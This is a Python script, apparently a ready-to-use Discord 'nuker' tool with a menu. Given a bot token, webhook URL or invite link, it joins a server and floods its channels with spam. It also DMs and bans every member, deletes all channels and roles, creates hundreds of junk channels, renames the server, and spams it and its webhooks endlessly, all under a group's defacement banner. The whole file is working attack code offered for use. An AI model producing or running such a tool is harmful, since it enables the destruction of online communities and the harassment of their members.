import discord
from discord.ext import commands
import asyncio
import os
import random
import time
import aiohttp
import json
import re

os.system('cls' if os.name == 'nt' else 'clear')

print("""
╔═══════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                       ║
║     ██╗  ██╗ █████╗  ██████╗     ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗          ║
║     ██║  ██║██╔══██╗██╔═══██╗    ████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗         ║
║     ███████║███████║██║   ██║    ██╔████╔██║███████║███████╗███████║███████║         ║
║     ██╔══██║██╔══██║██║▄▄ ██║    ██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══██║         ║
║     ██║  ██║██║  ██║╚██████╔╝    ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║         ║
║     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝         ║
║                                                                                       ║
║                    ██╗   ██╗ ██████╗ ███╗   ██╗    ██╗  ██╗ █████╗ ██╗   ██╗ ██████╗ ███████╗
║                    ██║   ██║██╔═══██╗████╗  ██║    ██║  ██║██╔══██╗██║   ██║██╔═══██╗██╔════╝
║                    ██║   ██║██║   ██║██╔██╗ ██║    ███████║███████║██║   ██║██║   ██║███████╗
║                    ╚██╗ ██╔╝██║   ██║██║╚██╗██║    ██╔══██║██╔══██║██║   ██║██║   ██║╚════██║
║                     ╚████╔╝ ╚██████╔╝██║ ╚████║    ██║  ██║██║  ██║╚██████╔╝╚██████╔╝███████║
║                      ╚═══╝   ╚═════╝ ╚═╝  ╚═══╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝
║                                                                                       ║
║                    ╔═══════════════════════════════════════════════════════════════╗  ║
║                    ║     HAQ MASHA VON KATIBA ULTIMATE MULTI-TOOL NUKER           ║  ║
║                    ║       DISCORD + WEBHOOK + INVITE + CHANNEL DESTROYER         ║  ║
║                    ╚═══════════════════════════════════════════════════════════════╝  ║
║                                                                                       ║
╚═══════════════════════════════════════════════════════════════════════════════════════╝
""")

# ============================================
# MESSAGES
# ============================================
HAQ_MESSAGE = """
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║              ██╗  ██╗ █████╗  ██████╗     ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗ ║
║              ██║  ██║██╔══██╗██╔═══██╗    ████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗║
║              ███████║███████║██║   ██║    ██╔████╔██║███████║███████╗███████║███████║║
║              ██╔══██║██╔══██║██║▄▄ ██║    ██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══██║║
║              ██║  ██║██║  ██║╚██████╔╝    ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║║
║              ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝║
║                                                                               ║
║                    VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH                    ║
║                                                                               ║
║                    YOU HAVE BEEN TERMINATED BY                                ║
║                    HAQ MASHA & VON KATIBA TEAM                                ║
║                                                                               ║
║                    https://discord.gg/c7cgYk4V                                ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

SPAM_LIST = [
    "@everyone **HAQ MASHA VON KATIBA TEAM DESTROYED THIS SERVER**",
    "```VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH```",
    "@everyone **https://discord.gg/c7cgYk4V**",
    "```HAQ MASHA + VON KATIBA = MAXIMUM DESTRUCTION```",
    "**الكتيبة هاق مشا تيم - VON KATIBA**",
    "@everyone **YOUR SERVER IS GONE FOREVER**",
    "```VON KATIBA WAS HERE```",
    "@everyone **VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH**",
    "```YOU HAVE BEEN VON KATIBA'ED```",
    "@everyone **HAQ MASHA KILLED THIS SERVER**",
    "@everyone **الكتيبة هاق مشا تيم - VON KATIBA**",
    "```LMOT RA7 TARJ3 LOT HHHH```",
]

# ============================================
# CHANNEL SPAMMER (VIA WEBHOOK OR MESSAGE)
# ============================================
async def channel_spammer(channel_url):
    """
    Spam a Discord channel using either:
    1. Webhook (if available)
    2. Direct messages via Discord API
    """
    print(f"\n[!] STARTING CHANNEL SPAM ON: {channel_url}")
    
    # Extract channel ID from URL
    channel_id_match = re.search(r'discord\.com/channels/\d+/(\d+)', channel_url)
    if not channel_id_match:
        # Try to get just channel ID if direct
        channel_id_match = re.search(r'(\d{17,20})', channel_url)
    
    if not channel_id_match:
        print("    ✗ INVALID CHANNEL URL!")
        return
    
    channel_id = channel_id_match.group(1)
    print(f"    ✓ CHANNEL ID: {channel_id}")
    
    # Method 1: Try to get webhook from channel (requires bot token)
    print("\n    🔧 OPTION 1: Trying to find webhook...")
    
    # Method 2: Direct API spam (without bot)
    print("\n    🔧 OPTION 2: Starting direct API spam...")
    
    spam_count = 0
    start_time = time.time()
    
    # Discord API endpoint for sending messages (requires bot token)
    # This will only work if you provide a bot token
    token = input("\n    🔧 ENTER BOT TOKEN (to send messages): ")
    
    headers = {
        "Authorization": f"Bot {token}",
        "Content-Type": "application/json"
    }
    
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                for msg in SPAM_LIST:
                    data = {"content": msg}
                    async with session.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", 
                                           headers=headers, json=data) as resp:
                        if resp.status == 200 or resp.status == 204:
                            spam_count += 1
                            if spam_count % 50 == 0:
                                elapsed = time.time() - start_time
                                print(f"    ✓ SENT {spam_count} MESSAGES in {elapsed:.1f}s")
                        elif resp.status == 403:
                            print("    ✗ BOT HAS NO PERMISSION TO SEND MESSAGES!")
                            return
                        elif resp.status == 401:
                            print("    ✗ INVALID TOKEN!")
                            return
                        await asyncio.sleep(0.05)
            except Exception as e:
                print(f"    ✗ ERROR: {str(e)[:50]}")
                await asyncio.sleep(1)

# ============================================
# WEBHOOK SPAMMER
# ============================================
async def webhook_spammer(webhook_url):
    print(f"\n[!] STARTING WEBHOOK SPAM ON: {webhook_url[:50]}...")
    
    spam_count = 0
    start_time = time.time()
    
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                for msg in SPAM_LIST:
                    data = {
                        "content": msg,
                        "username": random.choice(["HAQ-MASHA", "VON-KATIBA", "NUKER", "DESTROYER", "KATIBA-TEAM"])
                    }
                    async with session.post(webhook_url, json=data) as resp:
                        if resp.status == 204:
                            spam_count += 1
                            if spam_count % 100 == 0:
                                elapsed = time.time() - start_time
                                print(f"    ✓ SENT {spam_count} MESSAGES in {elapsed:.1f}s")
                        await asyncio.sleep(0.02)
            except:
                pass
            await asyncio.sleep(0.05)

# ============================================
# SERVER INVITE JOINER & DESTROYER
# ============================================
async def join_and_destroy(invite_code, token):
    print(f"\n[!] JOINING SERVER WITH INVITE: {invite_code}")
    
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    
    async with aiohttp.ClientSession() as session:
        # Join server
        async with session.post(f"https://discord.com/api/v9/invites/{invite_code}", headers=headers) as resp:
            if resp.status == 200:
                print("    ✓ JOINED SERVER SUCCESSFULLY!")
                data = await resp.json()
                guild_id = data.get('guild', {}).get('id')
                
                if guild_id:
                    print(f"    ✓ GUILD ID: {guild_id}")
                    return guild_id
            else:
                print(f"    ✗ FAILED TO JOIN: {resp.status}")
                return None

# ============================================
# BOT NUKE FUNCTION
# ============================================
async def bot_nuke(token, target_guild_id=None):
    print(f"\n[!] STARTING BOT NUKE...")
    
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix="", intents=intents)
    nuke_completed = False
    
    @bot.event
    async def on_ready():
        nonlocal nuke_completed
        print(f"    ✓ BOT ONLINE: {bot.user.name}")
        
        guilds = bot.guilds
        
        if target_guild_id:
            guild = bot.get_guild(int(target_guild_id))
            if guild:
                await nuke_guild(guild, bot)
                nuke_completed = True
                await bot.close()
            else:
                print(f"    ✗ GUILD NOT FOUND!")
                await bot.close()
        else:
            for guild in guilds:
                await nuke_guild(guild, bot)
            nuke_completed = True
            await bot.close()
    
    try:
        await bot.start(token)
        while not nuke_completed:
            await asyncio.sleep(1)
    except Exception as e:
        print(f"    ✗ BOT ERROR: {str(e)[:50]}")

async def nuke_guild(guild, bot):
    print(f"\n    🔥 NUKING: {guild.name}")
    
    first_channel = None
    for channel in guild.text_channels:
        first_channel = channel
        break
    
    if first_channel:
        await first_channel.send("```🔥 HAQ MASHA VON KATIBA NUKE INITIATED 🔥```")
    
    webhooks = []
    for ch in list(guild.text_channels)[:10]:
        for i in range(3):
            try:
                webhook = await ch.create_webhook(name="VON-KATIBA")
                webhooks.append(webhook)
                await asyncio.sleep(0.05)
            except:
                pass
    
    members = await guild.fetch_members(limit=None).flatten()
    tortured = 0
    for member in members:
        if not member.bot:
            try:
                for _ in range(3):
                    await member.send(HAQ_MESSAGE)
                    await asyncio.sleep(0.1)
                await member.ban(reason="VON KATIBA HAQ MASHA")
                tortured += 1
                await asyncio.sleep(0.05)
            except:
                pass
    
    print(f"    ✓ TORTURED & BANNED: {tortured}")
    
    for channel in guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0.02)
        except:
            pass
    
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                await asyncio.sleep(0.02)
            except:
                pass
    
    for i in range(300):
        try:
            await guild.create_text_channel(name=f"von-katiba-{i}")
            await asyncio.sleep(0.01)
        except:
            pass
    
    await guild.edit(name="VON KATIBA HAQ MASHA")
    
    async def spam():
        while True:
            for channel in guild.text_channels:
                try:
                    await channel.send(random.choice(SPAM_LIST))
                    await asyncio.sleep(0.05)
                except:
                    pass
            await asyncio.sleep(0.1)
    
    asyncio.create_task(spam())
    
    async def webhook_spam():
        while True:
            for webhook in webhooks:
                try:
                    await webhook.send(random.choice(SPAM_LIST))
                    await asyncio.sleep(0.05)
                except:
                    pass
            await asyncio.sleep(0.1)
    
    asyncio.create_task(webhook_spam())
    
    print(f"    ✓ NUKE COMPLETED ON: {guild.name}")

# ============================================
# MAIN MENU
# ============================================
async def main_menu():
    print("""
╔═══════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                       ║
║                              🎯 SELECT YOUR WEAPON 🎯                                  ║
║                                                                                       ║
║  ┌─────────────────────────────────────────────────────────────────────────────────┐  ║
║  │                                                                                 │  ║
║  │   [1] 🔧 BOT TOKEN NUKE        - Enter a bot token and destroy servers        │  ║
║  │                                                                                 │  ║
║  │   [2] 🪝 WEBHOOK SPAM          - Enter a webhook URL and spam it infinitely   │  ║
║  │                                                                                 │  ║
║  │   [3] 🔗 INVITE LINK NUKE      - Enter server invite and destroy it           │  ║
║  │                                                                                 │  ║
║  │   [4] 📢 CHANNEL SPAM          - Enter channel link and spam it (no join)     │  ║
║  │                                                                                 │  ║
║  │   [5] 💀 ALL IN ONE            - Do everything (Bot + Webhook + Invite)       │  ║
║  │                                                                                 │  ║
║  │   [6] 🚪 EXIT                  - Close the program                              │  ║
║  │                                                                                 │  ║
║  └─────────────────────────────────────────────────────────────────────────────────┘  ║
║                                                                                       ║
╚═══════════════════════════════════════════════════════════════════════════════════════╝
    """)
    
    while True:
        choice = input("\n📌 CHOOSE AN OPTION (1-6): ")
        
        if choice == "1":
            print("\n" + "─"*70)
            token = input("🔧 ENTER BOT TOKEN: ")
            print("\n⚙️ OPTIONS:")
            print("   [1] NUKE ALL SERVERS")
            print("   [2] NUKE SPECIFIC SERVER (by invite link)")
            sub = input("   CHOOSE: ")
            
            if sub == "2":
                invite = input("🔗 ENTER SERVER INVITE LINK: ")
                invite_code = re.search(r'(?:discord\.gg|discord\.com/invite)/([a-zA-Z0-9_-]+)', invite)
                if invite_code:
                    guild_id = await join_and_destroy(invite_code.group(1), token)
                    if guild_id:
                        await bot_nuke(token, guild_id)
                else:
                    print("❌ INVALID INVITE LINK!")
            else:
                await bot_nuke(token)
        
        elif choice == "2":
            print("\n" + "─"*70)
            webhook_url = input("🪝 ENTER WEBHOOK URL: ")
            if webhook_url.startswith("https://discord.com/api/webhooks/"):
                print("\n🔥 STARTING WEBHOOK SPAM...")
                await webhook_spammer(webhook_url)
            else:
                print("❌ INVALID WEBHOOK URL!")
        
        elif choice == "3":
            print("\n" + "─"*70)
            invite = input("🔗 ENTER SERVER INVITE LINK: ")
            token = input("🔧 ENTER BOT TOKEN (to join & destroy): ")
            invite_code = re.search(r'(?:discord\.gg|discord\.com/invite)/([a-zA-Z0-9_-]+)', invite)
            if invite_code:
                guild_id = await join_and_destroy(invite_code.group(1), token)
                if guild_id:
                    await bot_nuke(token, guild_id)
            else:
                print("❌ INVALID INVITE LINK!")
        
        elif choice == "4":
            print("\n" + "─"*70)
            channel_url = input("📢 ENTER CHANNEL LINK (e.g., https://discord.com/channels/123456/789012): ")
            print("\n🔥 STARTING CHANNEL SPAM...")
            await channel_spammer(channel_url)
        
        elif choice == "5":
            print("\n" + "─"*70)
            print("🔥 ALL IN ONE MODE ACTIVATED 🔥")
            
            token = input("🔧 ENTER BOT TOKEN: ")
            webhook_url = input("🪝 ENTER WEBHOOK URL (or press Enter to skip): ")
            invite = input("🔗 ENTER SERVER INVITE LINK (or press Enter to skip): ")
            channel_url = input("📢 ENTER CHANNEL LINK (or press Enter to skip): ")
            
            print("\n🔥 STARTING ALL ATTACKS SIMULTANEOUSLY...\n")
            
            if webhook_url and webhook_url.startswith("https://discord.com/api/webhooks/"):
                asyncio.create_task(webhook_spammer(webhook_url))
            
            if channel_url:
                asyncio.create_task(channel_spammer(channel_url))
            
            if invite:
                invite_code = re.search(r'(?:discord\.gg|discord\.com/invite)/([a-zA-Z0-9_-]+)', invite)
                if invite_code:
                    guild_id = await join_and_destroy(invite_code.group(1), token)
                    if guild_id:
                        await bot_nuke(token, guild_id)
                else:
                    await bot_nuke(token)
            else:
                await bot_nuke(token)
        
        elif choice == "6":
            print("\n🚪 EXITING... GOODBYE!")
            break
        
        else:
            print("❌ INVALID OPTION! TRY AGAIN.")
        
        print("\n" + "="*70)
        input("\nPRESS ENTER TO RETURN TO MENU...")
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""
╔═══════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                       ║
║                              🎯 SELECT YOUR WEAPON 🎯                                  ║
║                                                                                       ║
║  ┌─────────────────────────────────────────────────────────────────────────────────┐  ║
║  │                                                                                 │  ║
║  │   [1] 🔧 BOT TOKEN NUKE        - Enter a bot token and destroy servers        │  ║
║  │   [2] 🪝 WEBHOOK SPAM          - Enter a webhook URL and spam it infinitely   │  ║
║  │   [3] 🔗 INVITE LINK NUKE      - Enter server invite and destroy it           │  ║
║  │   [4] 📢 CHANNEL SPAM          - Enter channel link and spam it (no join)     │  ║
║  │   [5] 💀 ALL IN ONE            - Do everything (Bot + Webhook + Invite)       │  ║
║  │   [6] 🚪 EXIT                  - Close the program                              │  ║
║  │                                                                                 │  ║
║  └─────────────────────────────────────────────────────────────────────────────────┘  ║
║                                                                                       ║
╚═══════════════════════════════════════════════════════════════════════════════════════╝
        """)

# ============================================
# RUN
# ============================================
if __name__ == "__main__":
    asyncio.run(main_menu())
